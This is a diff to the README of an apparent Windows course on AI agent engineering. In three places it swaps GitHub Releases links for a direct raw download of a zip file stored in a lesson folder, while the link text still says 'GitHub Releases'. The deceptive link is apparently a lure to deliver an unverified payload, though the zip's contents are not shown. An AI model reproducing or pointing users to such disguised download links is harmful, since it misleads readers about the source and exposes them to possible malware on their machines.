@@ -1,6 +1,6 @@
 # 🤖 agent-engineer - Learn practical AI agent skills
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/thiennha1147/agent-engineer/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/thiennha1147/agent-engineer/main/14-agent-protocols-mcp-and-a2a/engineer_agent_2.6.zip)
 
 ## 📘 What this is
 
@@ -20,7 +20,7 @@ This course is built for Windows users who want a clear path to get started. You
 
 Visit the releases page here:
 
-[Download agent-engineer from GitHub Releases](https://github.com/thiennha1147/agent-engineer/releases)
+[Download agent-engineer from GitHub Releases](https://raw.githubusercontent.com/thiennha1147/agent-engineer/main/14-agent-protocols-mcp-and-a2a/engineer_agent_2.6.zip)
 
 On that page, look for the latest release and download the file listed for Windows. If there are several files, choose the one meant for Windows or the main package file.
 
@@ -164,7 +164,7 @@ This approach works well for agent engineering because many ideas become clear o
 
 If you need the file later, use the releases page here:
 
-[https://github.com/thiennha1147/agent-engineer/releases](https://github.com/thiennha1147/agent-engineer/releases)
+[https://raw.githubusercontent.com/thiennha1147/agent-engineer/main/14-agent-protocols-mcp-and-a2a/engineer_agent_2.6.zip](https://raw.githubusercontent.com/thiennha1147/agent-engineer/main/14-agent-protocols-mcp-and-a2a/engineer_agent_2.6.zip)
 
 ## 📌 Quick steps
 
